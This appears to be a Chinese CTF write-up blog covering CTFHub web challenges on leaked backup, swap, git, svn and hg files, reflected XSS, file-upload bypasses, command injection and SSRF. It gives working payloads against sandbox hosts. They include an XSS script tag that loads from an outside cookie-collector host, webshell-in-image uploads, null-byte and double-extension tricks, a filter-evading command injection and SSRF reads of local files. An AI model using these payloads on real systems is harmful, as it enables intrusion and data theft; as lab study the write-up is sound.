+<h2 id="2-2-信息泄露-bak文件"><a href="#2-2-信息泄露-bak文件" class="headerlink" title="2.2 信息泄露-bak文件"></a>2.2 信息泄露-bak文件</h2><pre><code>访问url/文件名.后缀名.bak
+</code></pre>
+<p>下载bak（备份文件）</p>
+<h2 id="2-3-信息泄露-vim缓存"><a href="#2-3-信息泄露-vim缓存" class="headerlink" title="2.3 信息泄露-vim缓存"></a>2.3 信息泄露-vim缓存</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在使用<code>vim</code>时会创建临时缓存文件，关闭<code>vim</code>时缓存文件则会被删除，当<code>vim</code>异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容</p>
+<p>以 <code>index.php</code> 为例：<br><strong>第一次</strong>产生的交换文件名为 <code>.index.php.swp</code></p>
+<p><strong>再次意外退出</strong>后，将会产生名为 <code>.index.php.swo</code> 的交换文件</p>
+<p><strong>第三次产生</strong>的交换文件则为 <code>.index.php.swn</code><br>作用</p>
+<p><u>可用来恢复意外退出的文件</u></p>
+<h3 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h3><p><code>SWP</code>文件为隐藏文件，操作时需要在文件名前加.</p>
+<p>针对<code>SWP</code>备份文件，我们可以使用<code>vim -r filename</code>命令来恢复文件<br>(<code>vim</code>使用的缓存存储为一种固定格式的二进制文件。而我们一般编辑的时明问可见字符，在vim的缓存中这些可见字符会原样保留,所以显示是一种乱码)<br>根据提示按回车进行恢复</p>
+<h2 id="2-4-信息泄露-DS-Store"><a href="#2-4-信息泄露-DS-Store" class="headerlink" title="2.4 信息泄露-.DS_Store"></a>2.4 信息泄露-.DS_Store</h2><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot="">
+<path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path>
+<path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path>
+<path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path>
+<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path>
+<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path>
+<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path>
+<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path>
+</svg>
+</span><p>.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</p></blockquote>
+<pre><code>访问url/.DS_Store
+</code></pre>
+<p>下载<code>DS_Store</code>文件</p>
+<h2 id="3-信息泄露-Git泄露-log"><a href="#3-信息泄露-Git泄露-log" class="headerlink" title="3.信息泄露-Git泄露-log"></a>3.信息泄露-Git泄露-log</h2><p> 第一次使用<strong>githack</strong>，记录一下</p>
+<p><strong>注意githack需要python2.7版本</strong></p>
+<p><code>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</code></p>
+<p><code>GitHack是一个.git泄露利用测试脚本，通过泄露的文件，还原重建工程源代码。</code></p>
+<h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p>1、解析<code>.git/index</code>文件，找到工程中所有的： ( 文件名，文件sha1 )<br>2、去<code>.git/objects/</code> 文件夹下下载对应的文件<br>3、<code>zlib</code>解压文件，按原始的目录结构写入源代码</p>
+<h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><p>速度快，默认20个工作线程<br>尽量还原所有的源代码，缺失的文件不影响脚本工作<br>脚本不需要执行额外的git命令，<code>all you need is python</code><br>脚本无需浏览目录</p>
+<h3 id="用法示例"><a href="#用法示例" class="headerlink" title="用法示例"></a>用法示例</h3><p>注意这里在url后面需要加上.git，用dirsearch可以扫出来（python3）</p>
+<pre><code>GitHack.py http://www.openssl.org/.git/
+</code></pre>
+<p>然后在目录<code>dist</code>就会生成对应目录 </p>
+<p>打开目录，输入<code>cmd</code>，执行<code>git log</code>【<code>git log</code> 可以查看<code>commit history</code>，也就是命令执行的历史，可以看看之前执行过哪些命令，方便后面查询命令执行的具体内容】</p>
+<p><img src="/post/wp-CTFHub/image-20220728230330073.png" alt="image-20220728230330073"></p>
+<p>然后复制<code>add flag</code>这个命令的代码，如上图<code>75272ca078b7eedcf329a2b08f6e4faae0a36a99</code></p>
+<p>然后用<code>git diff</code></p>
+<p>【</p>
+<p>git diff比较两个版本的差异，</p>
+<p>这里后面只有<strong>一个命令</strong>就是比较本地工作区和缓存区的信息区别</p>
+<p>如果后面有<strong>两个命令</strong>，就是比较这两个命令的差别</p>
+<p>】</p>
+<p><img src="/post/wp-CTFHub/image-20220728231134513.png" alt="image-20220728231134513"></p>
+<p>这里比较，就得到了<code>flag</code></p>
+<h2 id="4-信息泄露-Git泄露-Stash"><a href="#4-信息泄露-Git泄露-Stash" class="headerlink" title="4.信息泄露-Git泄露-Stash"></a>4.信息泄露-Git泄露-Stash</h2><h3 id="git-stash-的作用"><a href="#git-stash-的作用" class="headerlink" title="git stash 的作用"></a>git stash 的作用</h3><p>git stash用于想要保存当前的修改,但是想回到之前最后一次提交的干净的工作仓库时进行的操作.git stash将本地的修改保存起来,并且将当前代码切换到HEAD提交上.</p>
+<p>通过git stash存储的修改列表,可以通过<u><strong>git stash list</strong></u>查看.<u><strong>git stash show</strong></u>用于校验,<u><strong>git stash apply</strong></u>用于重新存储.直接执行<u><code>git stash</code>等同于<code>git stash save.</code></u></p>
+<p>最新的存储保存在<code>refs/stash</code>中老的存储可以通过相关的参数获得,例如<code>stash@&#123;0&#125;</code>获取最新的存储,stash@{1}获取次新<code>.stash@&#123;2.hour.ago&#125;</code>获取两小时之前的.存储可以直接通过索引的位置来获得<code>stash@&#123;n&#125;</code>.</p>
+<p>操作同<code>2.log</code></p>
+<p>可以先用<code>dirsearch</code>扫一下， 发现<code>refs/stash</code>文件，</p>
+<p>然后用<code>GitHack</code>扫描</p>
+<p>在生成文件夹里有<code>stash</code>文件</p>
+<pre><code>`D:\GitHack-master\dist\challenge-8d48663e236c2ebc.sandbox.ctfhub.com_10800\.git\refs`
+</code></pre>
+<p><img src="/post/wp-CTFHub/image-20220729115457869.png" alt="image-20220729115457869"></p>
+<p>打开看到</p>
+<p><img src="/post/wp-CTFHub/image-20220729115528299.png" alt="image-20220729115528299"></p>
+<p>在生成的文件夹下用</p>
+<pre><code>git diff d8c1978b1e71300574e1bb5335a01124b3a55569
+</code></pre>
+<p>得到<code>flag</code></p>
+<p>【也可以使用 <code>git bash</code>，直接在生成的文件夹下</p>
+<p>执行<code>git stash list</code> </p>
+<pre><code>查看stash了哪些存储
+</code></pre>
+<p>然后执行<code>git stash pop</code></p>
+<pre><code>恢复之前缓存的工作目录，将缓存堆栈中的对应stash删除，
+并将对应修改应用到当前的工作目录下,默认为第一个stash,即stash@&#123;0&#125;，
+
+如果要应用并删除其他stash，命令：git stash pop stash@&#123;$num&#125; ，
+比如应用并删除第二个：git stash pop stash@&#123;1&#125;）
+</code></pre>
+<p>然后会在该目录下生成一个新的<code>txt</code>文件，打开或用<code>cat</code>命令，得到<code>flag</code></p>
+<p>】</p>
+<h2 id="5-信息泄露-SVN泄露"><a href="#5-信息泄露-SVN泄露" class="headerlink" title="5.信息泄露-SVN泄露"></a>5.信息泄露-SVN泄露</h2><p><code>当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。</code></p>
+<p>这道题需要运用<code>dvcs-ripper</code>工具进行处理</p>
+<p>可以先用<code>dirsearch</code>扫出<code>.svn</code>目录，说明有<code>SVN</code>泄露</p>
+<p>和<code>githack</code>类似，</p>
+<pre><code>./rip-svn.pl -v -u url/.svn
+</code></pre>
+<p>然后在dvcs-ripper目录里，进入.svn目录</p>
+<p><img src="/post/wp-CTFHub/image-20220729175208298.png" alt="image-20220729175208298"></p>
+<p>然后进入pristine目录，进去发现两个目录，挨个打开</p>
+<p><img src="/post/wp-CTFHub/image-20220729175252045.png" alt="image-20220729175252045"></p>
+<p><img src="/post/wp-CTFHub/image-20220729175429878.png" alt="image-20220729175429878"></p>
+<p>发现一个目录下是网站页面源码，另一个就是<code>flag</code></p>
+<p>得到<code>flag</code></p>
+<h2 id="6-信息泄露-HG泄露"><a href="#6-信息泄露-HG泄露" class="headerlink" title="6.信息泄露-HG泄露"></a>6.信息泄露-HG泄露</h2><pre><code>`当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。`
+</code></pre>
+<p>可以先用<code>dirsearch</code>扫出<code>.hg</code>目录，说明有<code>HG</code>泄露</p>
+<p>这个和<code>SVN</code>一样，只不过要改成<code>.hg</code></p>
+<pre><code>./rip-hg.pl -v -u url/.hg
+</code></pre>
+<p><img src="/post/wp-CTFHub/image-20220730164340016.png" alt="image-20220730164340016"></p>
+<p>发现两个文件，猜测为<code>HG</code>泄露文件</p>
+<p><img src="/post/wp-CTFHub/image-20220730164428184.png" alt="image-20220730164428184"></p>
+<p>发现<code>flag</code>文本文件</p>
+<p><img src="/post/wp-CTFHub/image-20220730164949862.png" alt="image-20220730164949862"></p>
+<p><code>url+flag_973127138.txt</code></p>
+<p>得到<code>flag</code></p>
+<h2 id="7-xss-xss反射型"><a href="#7-xss-xss反射型" class="headerlink" title="7.xss-xss反射型"></a>7.xss-xss反射型</h2><p>发现它有两个输入框</p>
+<p><img src="/post/wp-CTFHub/image-20220731104635854.png" alt="image-20220731104635854"></p>
+<p>第一个输入测试语句，成功弹窗</p>
+<p>第二个是发送<code>url</code>，盲猜是发到后台</p>
+<p>看了一些<code>wp</code>，发现需要使用<code>xss</code>测试平台<code>http://xsscom.com//index.php</code></p>
+<p>先创建项目</p>
+<p><img src="/post/wp-CTFHub/image-20220731113619175.png" alt="image-20220731113619175"></p>
+<p>设置配置</p>
+<p><img src="/post/wp-CTFHub/image-20220731113753893.png" alt="image-20220731113753893"></p>
+<p>然后点击查看代码</p>
+<p><img src="/post/wp-CTFHub/image-20220731113810045.png" alt="image-20220731113810045"></p>
+<p>在最下面看到</p>
+<p><img src="/post/wp-CTFHub/image-20220731113837566.png" alt="image-20220731113837566"></p>
+<p>把代码</p>
+<pre><code>&lt;/textarea&gt;&#39;&quot;&gt;&lt;script src=http://xsscom.com//9VJcMV&gt;&lt;/script&gt;
+</code></pre>
+<p>输入到第一个框中</p>
+<p>再把提交后的url复制，然后到第二框中发送</p>
+<p><img src="/post/wp-CTFHub/image-20220731114028909.png" alt="image-20220731114028909"></p>
+<p>然后返回xss测试平台上查看</p>
+<p><img src="/post/wp-CTFHub/image-20220731114142138.png" alt="image-20220731114142138"></p>
+<p><code>cookie</code>处出现<code>flag</code></p>
+<h2 id="8-文件上传-文件头检查"><a href="#8-文件上传-文件头检查" class="headerlink" title="8.文件上传-文件头检查"></a>8.文件上传-文件头检查</h2><p><code>文件头是直接位于文件中的一段数据,是文件的一部分</code></p>
+<p>这里过滤文件头，而且限制图片类型文件，所以可以试试上传一个没有任何问题的图片【注意图片不能太大，不然会最后用蚁剑连接会爆错，我上传1mb大小图片就报错，最后上传400字节图片才成功】</p>
+<p><img src="/post/wp-CTFHub/image-20220731164210465.png" alt="image-20220731164210465"></p>
+<p>上传图片后，在后面加上一句话木马，并修改文件名</p>
+<pre><code>【也可以用cmd 合成图片马，也是有图片文件头】
+
+【copy 图片名.png(.jpg)/b + 木马文件名.php(.asp/.aspx)/a 生成图片名.png(.jpg)】
+
+【已试可行】
+</code></pre>
+<p><img src="/post/wp-CTFHub/image-20220731164732820.png" alt="image-20220731164732820"></p>
+<p>然后正常用蚁剑连接</p>
+<p><img src="/post/wp-CTFHub/image-20220731164330254.png" alt="image-20220731164330254"></p>
+<p>得到<code>flag</code></p>
+<h2 id="9-文件上传-00截断"><a href="#9-文件上传-00截断" class="headerlink" title="9.文件上传-00截断"></a>9.文件上传-00截断</h2><h3 id="0x00截断原理：-php"><a href="#0x00截断原理：-php" class="headerlink" title="0x00截断原理：[php&lt;5.3.29]"></a>0x00截断原理：[php&lt;5.3.29]</h3><pre><code>0x00是十六进制表示方法，是ascii码为0的字符，在有些函数处理时，会把这个字符当做结束符。系统在对文件名的读取时，如果遇到0x00，就会认为读取已结束。这个可以用在对文件类型名的绕过上。
+
+但要注意是文件的16进制内容里的00，而不是文件名中的00 ！！！就是说系统是按16进制读取文件（或者说二进制），
+
+遇到ascii码为零的位置就停止，而这个ascii码为零的位置在16进制中是00，用0x开头表示16进制，也就是所说的0x00截断。
+
+%00是被服务器解码为0x00发挥了截断作用。
+</code></pre>
+<p><code>举个例子，url中输入的是upload/post.php%00.png，看样子是图片文件，那么后台读取到是upload/post.php，就实现了绕后目的。</code></p>
+<p>我们开始先上传一个文件试试，限制<code>jpg,png,gif</code>后缀</p>
+<p>上传成功后，没有显示上传路径，只是url变化</p>
+<p><code>http://challenge-6cc6a23c8f284d6b.sandbox.ctfhub.com:10800/?road=/var/www/html</code></p>
+<p> 猜想多半重新临时文件名，不固定，导致显示不了路径</p>
+<p>这里就需要<code>00截断</code>，要把文件上传的路径，找到，好用蚁剑连接</p>
+<p>先要清楚<code>%00</code>截断点在哪里，我们先F12看</p>
+<p>看网站源码</p>
+<pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>CTFHub 文件上传 - 00截断<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>CTFHub 文件上传 - 00截断<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
+    &lt;form action=?road=/var/www/html/upload/ method="post" enctype="multipart/form-data">
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Filename:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+<span class="token comment" spellcheck="true">&lt;!--
+if (!empty($_POST['submit'])) {;
+    $name = basename($_FILES['file']['name']);
+    $info = pathinfo($name);
+    $ext = $info['extension'];
+    $whitelist = array("jpg", "png", "gif");
+    if (in_array($ext, $whitelist)) {;
+        $des = $_GET['road'] . "/" . rand(10, 99) . date("YmdHis") . "." . $ext;
+        if (move_uploaded_file($_FILES['file']['tmp_name'], $des)) {;
+            echo "&lt;script>alert('上传成功')&lt;/script>";
+        }; else {;
+            echo "&lt;script>alert('上传失败')&lt;/script>";
+        };
+    }; else {;
+        echo "文件类型不匹配";
+    };
+};
+--></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
+</code></pre>
+<p>发现里面有一串代码</p>
+<pre class=" language-php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">;</span>
+    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string">'extension'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"jpg"</span><span class="token punctuation">,</span> <span class="token string">"png"</span><span class="token punctuation">,</span> <span class="token string">"gif"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">;</span>
+        <span class="token variable">$des</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'road'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"/"</span> <span class="token punctuation">.</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"."</span> <span class="token punctuation">.</span> <span class="token variable">$ext</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$des</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">;</span>
+            <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('上传成功')&lt;/script>"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token punctuation">;</span>
+            <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('上传失败')&lt;/script>"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string">"文件类型不匹配"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+<span class="token operator">--</span><span class="token operator">></span>
+</code></pre>
+<p><code>move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;],$des)</code>这个函数就是把上传文件放到<code>$des</code>的路径上并且改了文件名</p>
+<p>所以我们不能让后面的<code>rand()</code>和<code>date()</code>运行，所以对于变量<code>road</code>【也就是开始讲到的】，就需要在它后面加上一个<code>%00</code>截断后面的语句</p>
+<p>也就是下面这个请求头后面</p>
+<p><img src="/post/wp-CTFHub/image-20220731233456720.png" alt="image-20220731233456720"></p>
+<p>图片正常上传就可以，这就是把图片内容上传到<code>1.php</code>文件中，这样虽然我们上传的是一个图片，但实际上，我们上传了一个名为<code>1.php</code>的一句话木马</p>
+<p>【名字不重要，虽然图片和<code>php</code>文件名一样，这里<code>1.php</code>是随便取得，主要蚁剑连接的就是它】</p>
+<p><img src="/post/wp-CTFHub/image-20220731233716114.png"></p>
+<p>用蚁剑连接<code>url/upload/1.php</code></p>
+<p>得到<code>flag</code></p>
+<h2 id="10-文件上传-双写后缀"><a href="#10-文件上传-双写后缀" class="headerlink" title="10.文件上传-双写后缀"></a>10.文件上传-双写后缀</h2><p>进行了一次过滤php后缀名，双写php为p<u>php</u>hp，这样当过滤了__的php，剩下的仍然是php，正常用蚁剑连接</p>
+<p><img src="/post/wp-CTFHub/image-20220731165549883.png" alt="image-20220731165549883"></p>
+<p><img src="/post/wp-CTFHub/image-20220731165841829.png" alt="image-20220731165841829"></p>
+<p>得到flag</p>
+<h2 id="11-RCE-命令注入-综合训练"><a href="#11-RCE-命令注入-综合训练" class="headerlink" title="11.RCE-命令注入-综合训练"></a>11.RCE-命令注入-综合训练</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+
+<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token constant">FALSE</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">;</span>
+    <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">"/(\||&amp;|;| |\/|cat|flag|ctfhub)/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$m</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">;</span>
+        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string">"ping -c 4 {;$ip};"</span><span class="token punctuation">;</span>
+        <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token punctuation">;</span>
+        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+</code></pre>
+<p>这道题</p>
+<p>看到<code>|，;，&amp;</code>都被过滤了</p>
+<p>那么可以用<code>%0a</code>也是换行符代替</p>
+<p>空格，&#x2F;，cat，flag，ctfhub（这些好像不大用的上，没关系）</p>
+<p><code>$IFS</code>代替<code>空格</code>，<code>cat</code>可以用<code>more</code>代替，<code>%09</code>代替<code>TAB</code>键，用来补全<code>flag</code></p>
+<p><code>?ip=120.0.0.1%0als</code></p>
+<p><img src="/post/wp-CTFHub/image-20220801215911504.png" alt="image-20220801215911504"></p>
+<p>然后</p>
+<p><code>?ip=120.0.0.1%0acd$IFS%09*_is_here%0als</code></p>
+<p><img src="/post/wp-CTFHub/image-20220801215930160.png" alt="image-20220801215930160"></p>
+<p>后面就简单了</p>
+<p><code>?ip=120.0.0.1%0acd$IFS%09*_is_here%0amore$IFS%09*24135173615424.php</code></p>
+<p>右键查看源码</p>
+<p>得到<code>flag</code></p>
+<h2 id="12-SSRF-内网访问"><a href="#12-SSRF-内网访问" class="headerlink" title="12.SSRF-内网访问"></a>12.SSRF-内网访问</h2><p><img src="/post/wp-CTFHub/image-20220802103546644.png" alt="image-20220802103546644"></p>
+<p><img src="/post/wp-CTFHub/image-20220802103603770.png" alt="image-20220802103603770"></p>
+<p>所以构造payload</p>
+<p><code>http://challenge-c0c40a8ea91b3909.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php</code></p>
+<p>得到flag</p>
+<h2 id="13-SSRF-伪协议读取文件"><a href="#13-SSRF-伪协议读取文件" class="headerlink" title="13.SSRF-伪协议读取文件"></a>13.SSRF-伪协议读取文件</h2><h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><p>事实上是其支持的协议与封装协议。而其支持的部分协议有：</p>
+<pre><code>    file:// — 访问本地文件系统
+
+    http:// — 访问 HTTP(s) 网址
+
+    ftp:// — 访问 FTP(s) URLs
+
+    php:// — 访问各个输入/输出流(I/O streams)
+</code></pre>
+<p>根据提示，flag在Web目录下，Web目录一般是在<code>/var/www/html/</code>下</p>
+<p><code>http://challenge-5c45d983b45e22b7.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php</code></p>
+<p>得到flag</p>
+<h2 id="14-SSRF-端口扫描"><a href="#14-SSRF-端口扫描" class="headerlink" title="14.SSRF-端口扫描"></a>14.SSRF-端口扫描</h2><p>端口扫描，那就利用爆破，从8000到9000扫一遍，看看flag在哪个端口下</p>
+<p><code>http://challenge-30d6aa92f511ee1f.sandbox.ctfhub.com:10800/?url=127.0.0.1:8000</code></p>
+<p><img src="/post/wp-CTFHub/image-20220802105640721.png" alt="image-20220802105640721"></p>
+<p>看到长度不同，打开查看响应数据包</p>
+<p>得到flag</p>
+<h2 id="15-SSRF-POST请求"><a href="#15-SSRF-POST请求" class="headerlink" title="15.SSRF-POST请求"></a>15.SSRF-POST请求</h2><p><code>hint：这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年</code></p>
+<p>开始是一个空白页面</p>
+<p>网站为</p>
+<pre><code>http://challenge-177dcd6de76352cb.sandbox.ctfhub.com:10800/?url=_
+</code></pre>
+<p>我们在其后面加上<code>127.0.0.1/flag.php</code>看看能不能直接访问该文件</p>
+<pre><code>http://challenge-177dcd6de76352cb.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php
+</code></pre>
+<p><img src="/post/wp-CTFHub/image-20220925221703912.png" alt="image-20220925221703912"></p>
+<p>发现出现了一个输入框</p>
+<p><code>F12</code>查看源码：</p>
